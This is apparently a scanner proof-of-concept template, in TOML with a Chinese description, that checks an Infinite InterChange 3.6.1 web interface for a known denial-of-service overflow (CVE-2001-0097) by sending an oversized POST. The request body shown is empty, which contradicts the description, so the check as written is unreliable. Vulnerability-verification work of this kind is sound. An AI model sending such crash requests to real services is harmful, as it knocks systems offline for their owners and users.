[info]
author = "ave"
description = "向 Infinite InterChange 3.6.1 HTTP 服务发送构造的超大 POST 请求（约 963+ 字节），触发缓冲区溢出导致服务进程崩溃，验证是否存在拒绝服务漏洞"
id = "POC-AVE-2001-0040"
name = "Infinite InterChange 3.6.1 Web 接口拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2001-0040"]
vuln_id = [
    "CVE-2001-0097",
    "AVE-2001-0040",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "Bad Request",
    "Internal Server Error",
    "Service Unavailable",
]
